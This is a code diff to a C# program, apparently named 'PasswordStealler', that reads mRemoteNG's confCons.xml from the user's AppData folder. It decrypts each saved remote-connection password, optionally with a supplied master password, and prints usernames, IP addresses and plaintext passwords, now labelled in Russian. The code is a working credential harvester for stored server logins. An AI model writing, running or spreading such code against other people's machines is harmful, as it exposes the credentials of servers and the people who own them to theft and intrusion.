@@ -6,7 +6,7 @@ using Org.BouncyCastle.Crypto.Parameters;
 using Org.BouncyCastle.Security;
 using PasswordStealler.Decryprion;
 using PasswordStealler.Decryption;
-using PasswordStealler.Decryption;
+
 using PasswordStealler.Factories;
 using System;
 using System.IO;
@@ -41,26 +41,28 @@ namespace PasswordStealler.App
                 string appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                 pathToXml = Path.Combine(appDataPath, "mRemoteNG", "confCons.xml");
             }
-            
+
             //Console.WriteLine(pathToXml);
             XDocument xDocument = XDocument.Load(pathToXml);
-            ICryptographyProvider cryptoProvider = new CryptoProviderFactoryFromXml(xDocument.Root).Build();
+            ICryptographyProvider cryptoProvider =
+                new CryptoProviderFactoryFromXml(xDocument.Root).Build();
 
-            ConfigParser parser = new ConfigParser();
-            List<Connection> connections = ConfigParser.ConfigParse(pathToXml);
+            List<Connection> connections = ConfigParser.ConfigParse(pathToXml, masterPassword);
 
 
-            int counter = 1;
             foreach (Connection con in connections)
             {
-                if (!(masterPassword == null))
-                {
+                if (masterPassword != null)
                     con.defaultPass = masterPassword;
-                }
-                string password = cryptoProvider.Decrypt(con.password, con.defaultPass.ConvertToSecureString());
-                Console.WriteLine($"Connection number: {counter} \n Connection name: {con.connectionName}" +
-                    $" \n Connection ip: {con.hostname} \n Connection password: {password}\n Connection username: {con.username} \n");
-                counter++;
+
+                string clearPass = cryptoProvider.Decrypt(
+                    con.password,
+                    con.defaultPass.ConvertToSecureString());
+
+                Console.WriteLine($"Имя пользователя: {con.username}");
+                Console.WriteLine($"IP-адрес: {con.hostname}");
+                Console.WriteLine($"Пароль: {clearPass}");
+                Console.WriteLine();
             }
 
         }
